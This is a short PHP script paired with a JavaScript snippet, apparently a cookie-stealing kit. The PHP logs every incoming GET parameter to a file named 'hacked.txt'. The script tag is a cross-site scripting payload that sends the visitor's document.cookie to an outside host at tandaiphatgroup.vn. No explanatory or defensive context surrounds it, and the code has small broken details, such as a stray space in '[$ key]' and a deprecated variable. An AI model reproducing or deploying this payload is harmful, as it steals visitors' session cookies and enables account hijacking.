<?php

define ("LINE", "\r\n");

define ("HTML_LINE", "<br>");

function getvars($arr, $title)

{

$res = "";

$len = count($arr);

if ($len>0)

{

if (strlen($title)>0)

{

print("[--------$title--------]" . HTML_LINE);

$res .= "[--------$title--------]" . LINE;

}

foreach ($arr as $key => $value)

{

print("[$key]" . HTML_LINE);

print($arr[$key] . HTML_LINE);

$res .= "[$ key]" . LINE . $arr[$key] . LINE;

}

}

return $res;

}

// get current date

$now = date("Y-m-d H : i : s ");

// init

$myData = "[-----$now-----]" . LINE;

// get

$myData .= getvars($HTTP_GET_VARS, "");

// file

$file = "hacked.txt";

$mode = "r+";

if (!file_exists($file))

$mode = "w+";

$fp = fopen ($file, $mode);

fseek($fp, 0, SEEK_END);

fwrite($fp, $myData);

fclose($fp);

?> 
<script>
document.write('<img src=http://tandaiphatgroup.vn/demo.php?docs='+escape

(document.cookie)+'>') 
</script>